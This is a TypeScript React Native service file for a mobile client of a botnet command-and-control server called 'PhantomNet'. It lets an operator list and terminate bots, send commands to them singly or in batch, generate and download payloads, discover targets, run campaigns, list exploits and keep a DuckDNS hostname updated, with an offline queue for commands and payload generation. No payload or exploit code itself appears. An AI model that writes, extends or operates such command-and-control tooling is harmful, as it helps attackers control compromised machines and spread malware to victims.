// API Service Layer for PhantomNet C2 Server Communication

import AsyncStorage from '@react-native-async-storage/async-storage';
import { ApiResponse, LoginCredentials, Bot, Command, Target, Payload, Campaign, Task, ServerStats, ServerConfig, CommandRequest, PayloadGenerationRequest, TargetDiscoveryRequest, CampaignRequest } from '../types';
import { API_ENDPOINTS, SERVER_CONFIG, STORAGE_KEYS, ERROR_MESSAGES } from '../constants';

class ApiService {
  private baseURL: string;
  private timeout: number;
  private sessionToken: string | null = null;

  constructor() {
    this.baseURL = SERVER_CONFIG.DEFAULT_URL;
    this.timeout = SERVER_CONFIG.TIMEOUT;
    this.loadSessionToken();
  }

  // Configuration Management
  async setServerConfig(config: ServerConfig): Promise<void> {
    this.baseURL = `${config.useSSL ? 'https' : 'http'}://${config.url}:${config.port}`;
    this.timeout = config.timeout;
    await AsyncStorage.setItem(STORAGE_KEYS.SERVER_CONFIG, JSON.stringify(config));
  }

  async getServerConfig(): Promise<ServerConfig> {
    const stored = await AsyncStorage.getItem(STORAGE_KEYS.SERVER_CONFIG);
    if (stored) {
      return JSON.parse(stored);
    }
    return {
      url: SERVER_CONFIG.DEFAULT_URL.replace('https://', ''),
      port: SERVER_CONFIG.DEFAULT_PORT,
      useSSL: true,
      timeout: SERVER_CONFIG.TIMEOUT,
    };
  }

  // Session Management
  private async loadSessionToken(): Promise<void> {
    try {
      const token = await AsyncStorage.getItem(STORAGE_KEYS.AUTH_TOKEN);
      this.sessionToken = token;
    } catch (error) {
      console.error('Failed to load session token:', error);
    }
  }

  private async saveSessionToken(token: string): Promise<void> {
    try {
      this.sessionToken = token;
      await AsyncStorage.setItem(STORAGE_KEYS.AUTH_TOKEN, token);
    } catch (error) {
      console.error('Failed to save session token:', error);
    }
  }

  private async clearSessionToken(): Promise<void> {
    try {
      this.sessionToken = null;
      await AsyncStorage.removeItem(STORAGE_KEYS.AUTH_TOKEN);
    } catch (error) {
      console.error('Failed to clear session token:', error);
    }
  }

  // HTTP Request Helper
  private async makeRequest<T>(
    endpoint: string,
    options: RequestInit = {}
  ): Promise<ApiResponse<T>> {
    try {
      const url = `${this.baseURL}${endpoint}`;
      const headers: Record<string, string> = {
        'Content-Type': 'application/json',
        ...options.headers,
      };

      // Add session token if available (for admin endpoints)
      if (this.sessionToken && endpoint.startsWith('/admin')) {
        // For admin endpoints, we might need different auth method
        // This depends on how the server handles admin authentication
      }

      const config: RequestInit = {
        ...options,
        headers,
        signal: AbortSignal.timeout(this.timeout),
      };

      console.log(`Making request to: ${url}`);

      const response = await fetch(url, config);

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        return {
          success: false,
          error: errorData.error || `HTTP ${response.status}: ${response.statusText}`,
        };
      }

      const data = await response.json();
      return {
        success: true,
        data,
      };
    } catch (error) {
      console.error('API Request failed:', error);

      if (error instanceof Error) {
        if (error.name === 'AbortError') {
          return {
            success: false,
            error: ERROR_MESSAGES.TIMEOUT_ERROR,
          };
        }
        return {
          success: false,
          error: error.message || ERROR_MESSAGES.NETWORK_ERROR,
        };
      }

      return {
        success: false,
        error: ERROR_MESSAGES.UNKNOWN_ERROR,
      };
    }
  }

  // Authentication Methods
  async login(credentials: LoginCredentials): Promise<ApiResponse<any>> {
    const result = await this.makeRequest('/admin/login', {
      method: 'POST',
      body: JSON.stringify(credentials),
    });

    if (result.success && result.data?.session_token) {
      await this.saveSessionToken(result.data.session_token);
    }

    return result;
  }

  async logout(): Promise<ApiResponse<any>> {
    const result = await this.makeRequest('/admin/logout', {
      method: 'POST',
    });

    if (result.success) {
      await this.clearSessionToken();
    }

    return result;
  }

  // Dashboard Methods
  async getDashboardStats(): Promise<ApiResponse<ServerStats>> {
    return this.makeRequest('/admin/stats');
  }

  // Bot Management Methods
  async getBots(): Promise<ApiResponse<Bot[]>> {
    return this.makeRequest(API_ENDPOINTS.BOTS);
  }

  async sendCommand(command: CommandRequest): Promise<ApiResponse<any>> {
    return this.makeRequest(API_ENDPOINTS.SEND_COMMAND, {
      method: 'POST',
      body: JSON.stringify(command),
    });
  }

  async terminateBot(botId: string): Promise<ApiResponse<any>> {
    return this.makeRequest(`/admin/bots/${botId}/terminate`, {
      method: 'POST',
    });
  }

  // Payload Management Methods
  async getPayloads(): Promise<ApiResponse<Payload[]>> {
    return this.makeRequest(API_ENDPOINTS.PAYLOADS);
  }

  async generatePayload(payload: PayloadGenerationRequest): Promise<ApiResponse<any>> {
    return this.makeRequest(API_ENDPOINTS.GENERATE_PAYLOAD, {
      method: 'POST',
      body: JSON.stringify(payload),
    });
  }

  async downloadPayload(payloadId: number): Promise<ApiResponse<any>> {
    return this.makeRequest(API_ENDPOINTS.DOWNLOAD_PAYLOAD(payloadId));
  }

  // Target Discovery Methods
  async getTargets(): Promise<ApiResponse<Target[]>> {
    return this.makeRequest(API_ENDPOINTS.TARGETS);
  }

  async discoverTargets(request: TargetDiscoveryRequest): Promise<ApiResponse<any>> {
    return this.makeRequest(API_ENDPOINTS.DISCOVER_TARGETS, {
      method: 'POST',
      body: JSON.stringify(request),
    });
  }

  // Campaign Management Methods
  async getCampaigns(): Promise<ApiResponse<Campaign[]>> {
    return this.makeRequest(API_ENDPOINTS.CAMPAIGNS);
  }

  async createCampaign(campaign: CampaignRequest): Promise<ApiResponse<any>> {
    return this.makeRequest(API_ENDPOINTS.CREATE_CAMPAIGN, {
      method: 'POST',
      body: JSON.stringify(campaign),
    });
  }

  // Task Management Methods
  async getTasks(): Promise<ApiResponse<Task[]>> {
    return this.makeRequest(API_ENDPOINTS.TASKS);
  }

  // Exploit Methods
  async getExploits(): Promise<ApiResponse<any[]>> {
    return this.makeRequest(API_ENDPOINTS.EXPLOITS);
  }

  // DuckDNS Methods
  async updateDuckDNS(): Promise<ApiResponse<any>> {
    return this.makeRequest(API_ENDPOINTS.DUCKDNS_UPDATE, {
      method: 'POST',
    });
  }

  async toggleDuckDNS(active: boolean): Promise<ApiResponse<any>> {
    return this.makeRequest(API_ENDPOINTS.DUCKDNS_TOGGLE, {
      method: 'POST',
      body: JSON.stringify({ is_active: active }),
    });
  }

  // Utility Methods
  async testConnection(): Promise<boolean> {
    try {
      const result = await this.makeRequest('/admin/dashboard', {
        method: 'GET',
      });
      return result.success;
    } catch (error) {
      console.error('Connection test failed:', error);
      return false;
    }
  }

  // Batch Operations
  async batchSendCommands(commands: CommandRequest[]): Promise<ApiResponse<any>[]> {
    const promises = commands.map(command => this.sendCommand(command));
    return Promise.all(promises);
  }

  async batchTerminateBots(botIds: string[]): Promise<ApiResponse<any>[]> {
    const promises = botIds.map(botId => this.terminateBot(botId));
    return Promise.all(promises);
  }

  // Real-time Updates (WebSocket simulation with polling)
  startPolling(endpoint: string, interval: number, callback: (data: any) => void): () => void {
    const poll = async () => {
      try {
        const result = await this.makeRequest(endpoint);
        if (result.success && result.data) {
          callback(result.data);
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    };

    // Initial poll
    poll();

    // Set up interval
    const intervalId = setInterval(poll, interval);

    // Return cleanup function
    return () => clearInterval(intervalId);
  }

  // Error Handling
  private handleApiError(error: any): ApiResponse<any> {
    console.error('API Error:', error);

    if (error.name === 'TypeError' && error.message.includes('fetch')) {
      return {
        success: false,
        error: ERROR_MESSAGES.NETWORK_ERROR,
      };
    }

    if (error.name === 'AbortError') {
      return {
        success: false,
        error: ERROR_MESSAGES.TIMEOUT_ERROR,
      };
    }

    return {
      success: false,
      error: error.message || ERROR_MESSAGES.UNKNOWN_ERROR,
    };
  }

  // Request Interceptors (for future use)
  private async beforeRequest(config: RequestInit): Promise<RequestInit> {
    // Add any pre-request logic here (auth headers, etc.)
    return config;
  }

  private async afterResponse(response: Response): Promise<Response> {
    // Add any post-response logic here (token refresh, etc.)
    return response;
  }

  // Offline-aware methods
  async getBotsOfflineAware(): Promise<ApiResponse<Bot[]>> {
    return this.makeOfflineAwareRequest(
      () => this.getBots(),
      'bots'
    );
  }

    async getCommandsOfflineAware(): Promise<ApiResponse<Command[]>> {
      return this.makeOfflineAwareRequest(
        () => this.getTasks(), // Commands are stored as tasks
        'commands'
      );
    }

    async getTargetsOfflineAware(): Promise<ApiResponse<Target[]>> {
      return this.makeOfflineAwareRequest(
        () => this.getTargets(),
        'targets'
      );
    }

    async getPayloadsOfflineAware(): Promise<ApiResponse<Payload[]>> {
      return this.makeOfflineAwareRequest(
        () => this.getPayloads(),
        'payloads'
      );
    }

    async getCampaignsOfflineAware(): Promise<ApiResponse<Campaign[]>> {
      return this.makeOfflineAwareRequest(
        () => this.getCampaigns(),
        'campaigns'
      );
    }

    async getStatsOfflineAware(): Promise<ApiResponse<ServerStats>> {
      return this.makeOfflineAwareRequest(
        () => this.getDashboardStats(),
        'stats'
      );
    }

  // Enhanced offline-aware request wrapper
  private async makeOfflineAwareRequest<T>(
    onlineRequest: () => Promise<ApiResponse<T>>,
    cacheKey?: string
  ): Promise<ApiResponse<T> & { fromCache?: boolean }> {
    // Import offlineManager here to avoid circular dependencies
    const { offlineManager } = await import('./offline');

    try {
      // Try online request first
      if (this.isOnline) {
        const result = await onlineRequest();

        if (result.success && cacheKey && result.data) {
          await offlineManager.updateCache(cacheKey as any, result.data);
        }

        return { ...result, fromCache: false };
      }

      // Fall back to cached data
      if (cacheKey) {
        const cachedData = offlineManager.getCachedData(cacheKey as any);
        if (cachedData && (!Array.isArray(cachedData) || cachedData.length > 0)) {
          return {
            success: true,
            data: cachedData,
            fromCache: true,
          };
        }
      }

      return {
        success: false,
        error: 'No internet connection and no cached data available',
        fromCache: false,
      };
    } catch (error) {
      console.error('Offline-aware request failed:', error);

      // Try cached data as fallback
      if (cacheKey) {
        const cachedData = offlineManager.getCachedData(cacheKey as any);
        if (cachedData) {
          return {
            success: true,
            data: cachedData,
            fromCache: true,
          };
        }
      }

      return {
        success: false,
        error: 'Request failed and no cached data available',
        fromCache: false,
      };
    }
  }

  // Offline queue integration
  async sendCommandOfflineAware(command: CommandRequest): Promise<ApiResponse<any>> {
    const { offlineManager } = await import('./offline');

    if (!this.isOnline) {
      // Add to offline queue
      await offlineManager.addToOfflineQueue({
        type: 'command',
        data: command,
      });

      return {
        success: true,
        data: { queued: true, message: 'Command queued for offline execution' },
      };
    }

    return this.sendCommand(command);
  }

  async generatePayloadOfflineAware(payload: PayloadGenerationRequest): Promise<ApiResponse<any>> {
    const { offlineManager } = await import('./offline');

    if (!this.isOnline) {
      // Add to offline queue
      await offlineManager.addToOfflineQueue({
        type: 'payload_generation',
        data: payload,
      });

      return {
        success: true,
        data: { queued: true, message: 'Payload generation queued for offline execution' },
      };
    }

    return this.generatePayload(payload);
  }

  async createCampaignOfflineAware(campaign: CampaignRequest): Promise<ApiResponse<any>> {
    const { offlineManager } = await import('./offline');

    if (!this.isOnline) {
      // Add to offline queue
      await offlineManager.addToOfflineQueue({
        type: 'campaign_creation',
        data: campaign,
      });

      return {
        success: true,
        data: { queued: true, message: 'Campaign creation queued for offline execution' },
      };
    }

    return this.createCampaign(campaign);
  }

    async discoverTargetsOfflineAware(request: TargetDiscoveryRequest): Promise<ApiResponse<any>> {
      const { offlineManager } = await import('./offline');

      if (!this.isOnline) {
        // Add to offline queue
        await offlineManager.addToOfflineQueue({
          type: 'target_discovery',
          data: request,
        });

        return {
          success: true,
          data: { queued: true, message: 'Target discovery queued for offline execution' },
        };
      }

      return this.discoverTargets(request);
    }
  }

// Export singleton instance
export const apiService = new ApiService();
export default apiService;
